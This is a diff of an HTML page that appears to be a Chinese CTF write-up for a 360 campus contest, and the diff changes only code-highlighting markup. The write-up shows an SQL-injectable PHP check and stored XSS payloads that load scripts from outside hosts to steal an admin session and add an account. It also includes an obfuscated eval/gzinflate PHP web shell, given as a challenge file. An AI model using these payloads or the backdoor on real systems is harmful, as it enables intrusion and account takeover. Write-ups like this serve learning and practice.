@@ -45,11 +45,10 @@
 
 <p>首先保存那个图片，然后用winhex在尾部发现</p>
 
-<div class="language-bash highlighter-rouge"><pre class="highlight"><code>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
 Where is the key?<span class="o">{</span>ZW1lbS4uLiAvY3RmXzM2MF9mbGFn<span class="o">}</span>
 
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>然后base64_decode之后，为emem… /ctf_360_flag 后面群里提示苹果电脑，然后访问</p>
 
@@ -63,7 +62,7 @@ Where is the key?<span class="o">{</span>ZW1lbS4uLiAvY3RmXzM2MF9mbGFn<span class
 
 <p>http://isg.campus.360.cn/web2/check.php.swp</p>
 
-<div class="language-php highlighter-rouge"><pre class="highlight"><code>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
 <span class="cp">&lt;?php</span>
 
 <span class="sd">/***
@@ -88,20 +87,19 @@ test code 2
 
 <span class="p">{</span> 
 
-    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$db</span><span class="o">-&gt;</span><span class="na">count</span><span class="p">(</span><span class="s1">'admin'</span><span class="p">,</span><span class="s2">"email='</span><span class="si">{</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'email'</span><span class="p">]}</span><span class="s1">' ANDcode='</span><span class="p">{</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'code'</span><span class="p">]}</span><span class="s1">'")) 
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$db</span><span class="o">-&gt;</span><span class="na">count</span><span class="p">(</span><span class="s1">'admin'</span><span class="p">,</span><span class="s2">"email='</span><span class="si">{</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'email'</span><span class="p">]</span><span class="si">}</span><span class="s2">' ANDcode='</span><span class="si">{</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'code'</span><span class="p">]</span><span class="si">}</span><span class="s2">'"</span><span class="p">))</span> 
 
-        die('</span><span class="nx">error</span><span class="s1">');
+        <span class="k">die</span><span class="p">(</span><span class="s1">'error'</span><span class="p">);</span>
 
-    $_SESSION['</span><span class="nx">email</span><span class="s1">']= $_GET['</span><span class="nx">email</span><span class="err">'</span><span class="p">];</span> 
+    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'email'</span><span class="p">]</span><span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'email'</span><span class="p">];</span> 
 
         <span class="o">..........</span>
 
-<span class="si">}</span><span class="s2">
+<span class="p">}</span>
 
-?&gt;
+<span class="cp">?&gt;</span>
 
-</span></code></pre>
-</div>
+</code></pre></div></div>
 
 <p>然后找到了p神这篇文章</p>
 
@@ -127,17 +125,16 @@ test code 2
 
 <p><img src="http://ogmho3r7t.bkt.clouddn.com/2017-04-17-3365764845.png" alt="3365764845" /></p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
 --.  ..  ..-.  ---..  ----.  .-  ;
 
 &lt;..--..  .--.  ....  .--.   $.-   = "-----  .-.-.-  .----  ";$-...   = $_--.  .  -  [.----.  -...  .----.  ];..  ..-.  ($-...   -.-.--  = .----.  .----.  ){    ..  ..-.   (..  ...  _.-  .-.  .-.  .-  -.--  ($-...  )){        .  -.-.  ....  ---   "-.  ---   -.-  .  -.--  -.-.--  ";        .  -..-  ..  -  ;    }.  .-..  ...  .  ..  ..-.  (-.-.--  ..  ...  _-.  ..-  --  .  .-.  ..  -.-.  ($-...  )){       $-.-.   = (..  -.  -  )(($.-   + $-...  ) * .----  -----  );        ..  ..-.   ($-.-.   == "---..  " &amp;&amp; $-...  [.----  -----  ] == ..-.  .-  .-..  ...  .  ){            .  -.-.  ....  ---   "..-.  .-..  .-  --.  ";        }.  .-..  ...  .  {            .  -.-.  ....  ---   "-.  ---   -.-  .  -.--  -.-.--  ";            .  -..-  ..  -  ;        }    }.  .-..  ...  .  {        .  -.-.  ....  ---   "-.  ---   -.-  .  -.--  -.-.--  ";    }}.  .-..  ...  .  {    .  -.-.  ....  ---   "-.  ---   -.-  .  -.--  -.-.--  ";}..--..  &gt;
 
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>可以看到是莫尔斯编码加上了php的一些语法，把莫尔斯编码还原之后就可以得到php代码</p>
 
-<div class="language-php highlighter-rouge"><pre class="highlight"><code>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
 GIF89a;
 
 <span class="cp">&lt;?php</span>
@@ -194,8 +191,7 @@ GIF89a;
 
 <span class="cp">?&gt;</span>
 
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>就是要想办法绕过 对is_array和is_numeric的检查，进入flag的分支里</p>
 
@@ -215,17 +211,16 @@ GIF89a;
 
 <p>这题其实是一个xss的题目，因为页面描述说管理员会记录你的一切操作。先打了一发cookie，然后修改cookie。发现直接跳到首页，并没有什么卵用。后面用ajax偷到了页面的源码。通过分析源码发现，有一个添加用户的地方。首先xss的payload</p>
 
-<div class="language-html highlighter-rouge"><pre class="highlight"><code>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
 <span class="nt">&lt;/textarea&gt;</span>'"&gt;<span class="nt">&lt;script </span><span class="na">src=</span><span class="s">http://t.cn/R2CvZvl</span><span class="nt">&gt;&lt;/script&gt;</span>
 
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p><img src="http://ogmho3r7t.bkt.clouddn.com/2017-04-17-3409089775.png" alt="3409089775" /></p>
 
 <p>然后我们构造一个ajax添加一个账号。</p>
 
-<div class="language-javascript highlighter-rouge"><pre class="highlight"><code>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
 <span class="kd">var</span> <span class="nx">request</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
 
 
@@ -324,16 +319,14 @@ GIF89a;
 
 
 
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>然后提交</p>
 
-<div class="language-html highlighter-rouge"><pre class="highlight"><code>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
 <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">http://km2.in/360.js</span><span class="nt">&gt;&lt;/script&gt;</span>
 
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>登陆之后成功拿到flag</p>
 
@@ -377,7 +370,7 @@ GIF89a;
 
 <p>只是有一个分割的问题，一开始用,去分割就没有做出来，要用空格来分割，可以得到</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
 BHUK,LP 
 
 BHUK,LP 
@@ -402,34 +395,31 @@ TGBNHGYT
 
 UYGBN
 
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>一共有3类</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
 BHUK,LP
 
 UYGBN
 
 TGBNHGYT
 
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>我们尝试在键盘上把他们画出来，记得,也要占一个键位的</p>
 
 <p><img src="http://ogmho3r7t.bkt.clouddn.com/2017-04-17-1076458764.jpg" alt="1076458764" /></p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
 BHUK,LP   ：N
 
 UYGBN     ：C
 
 TGBNHGYT  : B
 
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>然后就是按照他的顺序输出flag了</p>
 
@@ -439,15 +429,14 @@ TGBNHGYT  : B
 
 <p>给了一个shell文件，提示是后门的密码就是flag</p>
 
-<div class="language-php highlighter-rouge"><pre class="highlight"><code>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
 <span class="cp">&lt;?php</span> 
 
 <span class="k">eval</span><span class="p">(</span><span class="nb">gzinflate</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="s2">"pZLdSsNAEIXvBd+hTmOzMXTbFC3UGhtFEANWlLZES5OgvauoIFho2jy7s7PJhMSIF5Kbb2fPzs+Z7O8ZiYAmhLAFS9bQzhUQIboUPECKiUQDMSFMkYZIZt+U5nFkYijB0Kh0KfCcp+5wlh+6YaO2H9VFbW2BNK8U2iJJoiOk9Pek4q/ZBTwG481T4HeD3mC9vH79en67fb+fjScPM38aOMvL6erEn6xePm+uLj7u1i669I9qAucL4ZSDesQWC9WwHlGxkZRpwW9t1ikrDCRwAE87dtvm7EphlRQd3taC6AwpIjJ4A4XFkhcQ81uhbZcw6EN20a67mHPHxX8Qc+YQP7vyvxQJIHNBa9usUBMcck5d1kNqEVmZl9CDkmNNnsLIFV3IKnsVRT4OOCQJdRNq76Pzbw=="</span><span class="p">)));</span>
 
 <span class="cp">?&gt;</span>
 
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>有这种解eval的特别方便的</p>
 
